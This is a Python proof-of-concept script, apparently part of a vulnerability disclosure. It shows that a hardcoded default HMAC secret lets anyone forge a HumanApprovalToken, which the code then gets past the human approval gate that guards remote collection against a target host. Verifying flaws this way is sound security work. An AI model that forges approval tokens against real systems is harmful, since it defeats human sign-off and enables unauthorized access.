"""PoC 3: Default Hardcoded HumanApprovalToken HMAC Secret Key.
Verifies that any unauthorized caller can forge a valid HumanApprovalToken
authorizing high-risk online collector execution by signing it with the hardcoded
default secret key 'forensicops-gate-secret'.
"""
import sys
from uuid import uuid4
from datetime import datetime, timezone
from backend.app.models.workflow import HumanApprovalToken
from backend.app.connectors.ssh_collector import OnlineCollectorOrchestrator, EndpointTarget
from backend.app.core.custody_engine import CustodyEngine

def run_poc():
    # Attacker crafts an approval token for online execution
    token = HumanApprovalToken(
        token_id=f"gate-forged-{uuid4().hex[:8]}",
        node_id="online_collector_gate",
        case_id="CASE-TARGET-001",
        issued_by="attacker (FORGED-BADGE)",
        timestamp_utc=datetime.now(timezone.utc).isoformat(),
        is_valid=True
    )
    
    # Attacker signs token using known hardcoded default secret
    token.sign(secret_key="forensicops-gate-secret")
    print(f"Forged Token Signature: {token.signature}")

    # Orchestrator initialized with default settings
    custody = CustodyEngine(vault_root="vault/test_poc_custody")
    orchestrator = OnlineCollectorOrchestrator(custody_engine=custody)
    
    target = EndpointTarget(
        endpoint_id="target-01",
        case_id="CASE-TARGET-001",
        host="victim-server.internal",
        os_type="windows",
        auth_type="ssh_key"
    )

    # Verify that orchestrator accepts the forged token
    try:
        orchestrator.verify_approval_gate(token, target)
        print("CONFIRMED: Forged HumanApprovalToken successfully passed orchestrator verification gate!")
        return True
    except Exception as e:
        print(f"FAILED: Token verification failed: {e}")
        return False

if __name__ == "__main__":
    success = run_poc()
    sys.exit(0 if success else 1)
